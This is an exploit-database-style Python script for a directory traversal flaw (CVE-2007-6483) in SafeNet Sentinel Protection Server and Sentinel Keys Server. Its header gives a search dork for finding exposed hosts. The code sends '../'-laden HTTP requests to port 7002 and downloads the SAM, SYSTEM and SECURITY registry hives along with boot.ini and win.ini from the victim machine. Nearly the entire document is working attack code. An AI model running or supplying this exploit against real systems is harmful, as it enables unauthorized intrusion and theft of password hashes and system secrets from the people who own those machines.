#
# Exploit Title: SafeNet Sentinel Protection Server 7.0 - 7.4 and Sentinel Keys Server 1.0.3 - 1.0.4 Directory Traversal
# Date: 04/28/2014
# Exploit Author: Matt Schmidt (Syph0n)
# Vendor Homepage: http://www.safenet-inc.com/
# Software Link: http://c3.safenet-inc.com/downloads/2/1/21DAC8BE-72DE-4D32-85D4-6A1FC600581E/Sentinel%20Protection%20Installer%207.4.0.exe
# Version: SafeNet Sentinel Protection Server 7.0.0 through 7.4.0 and Sentinel Keys Server 1.0.3
# Tested on: Windows 7 and Windows XP SP2
# CVE: CVE-2007-6483
# Dork: intitle:"Sentinel Keys License Monitor"
# Greets to norsec0de
 
import sys, urllib2, argparse
 
print &#039;\n[+] SafeNet Sentinel Protection Server 7.0 - 7.4 Directory Traversal Exploit&#039;
print &#039;[+] Written by Matt Schmidt (Syph0n)&#039;
print &#039;[+] This script will download the registry hives, boot.ini and win.ini off the Target Windows box&#039;
print &#039;[+] For Windows versions other than Windows XP you will have to append the --file option and specifiy a file\n&#039;
 
 
# Define Help Menu
if (len(sys.argv) < 2) or (sys.argv[1] == &#039;-h&#039;) or (sys.argv[1] == &#039;--help&#039;):
    print &#039;Usage:&#039;
    print &#039;./exploit.py --host <target> [options]&#039;
    print &#039;    <host>: The victim host\n&#039;
    print &#039;  Options:&#039;
    print &#039;    --port      The port the application is listening on (default: 7002)&#039;
    print &#039;    --file      Path to the desired remote file (ex. windows/repair/sam) without starting slash\n\n&#039;
    sys.exit(1)
 
# Parse Arguments
parser = argparse.ArgumentParser()
parser.add_argument(&#039;--host&#039;, required = True)
parser.add_argument(&#039;--port&#039;, type = int, default = 7002)
parser.add_argument(&#039;--file&#039;)
args = parser.parse_args()
 
# Define Variables
host = args.host
port = args.port
if args.file is not None :
    targetFile = [args.file]
else:
    targetFile = [&#039;windows/repair/default&#039;, &#039;windows/repair/sam&#039;, &#039;windows/repair/system&#039;, &#039;windows/repair/software&#039;, &#039;windows/repair/security&#039;, &#039;boot.ini&#039;, &#039;windows/win.ini&#039;]
 
# Send Exploit
print &#039;[+] Sending exploit!&#039;
 
# Loop for multiple files
for path in targetFile:
    # Define Directory Traversal path
    url = "http://" + host + ":" + str(port) + "/../../../../../../../../../../../../../../" + str(path)
         
    # Retrieve file(s)
    exploit = urllib2.urlopen(url)
    header = exploit.info()
    size = int(header.getheaders("Content-Length")[0])
    print "\n[+] Downloading: C:\%s ! Bytes: %s" % (path, size)
    filename = url.rsplit(&#039;/&#039;,1)
    with open(str(filename[1]), "wb") as contents:
        contents.write(exploit.read())
print &#039;\n[+] Done!\n&#039;

